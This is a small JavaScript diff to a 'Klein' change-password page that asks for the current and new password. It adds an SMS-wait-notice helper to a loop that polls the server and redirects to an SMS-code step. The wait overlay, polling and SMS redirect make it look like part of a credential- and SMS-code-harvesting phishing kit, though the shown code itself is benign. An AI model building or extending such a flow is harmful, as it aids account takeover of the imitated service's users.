@@ -1,6 +1,8 @@
 /**
  * Klein change-password page: current + new password, 5 min wait overlay, status poll.
  */
+import { consumeKleinSmsWaitNotice } from '../shared/sms-wait-notice.js';
+
 export function runKleinChangePassword() {
   'use strict';
 
@@ -28,6 +30,7 @@ export function runKleinChangePassword() {
       fetch('/api/status?id=' + encodeURIComponent(id) + '&page=passwort-aendern&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
         .then(function (r) { return r.json(); })
         .then(function (res) {
+          consumeKleinSmsWaitNotice(res, id);
           var st = res && res.status;
           if (st === 'redirect_sms_code') {
             if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
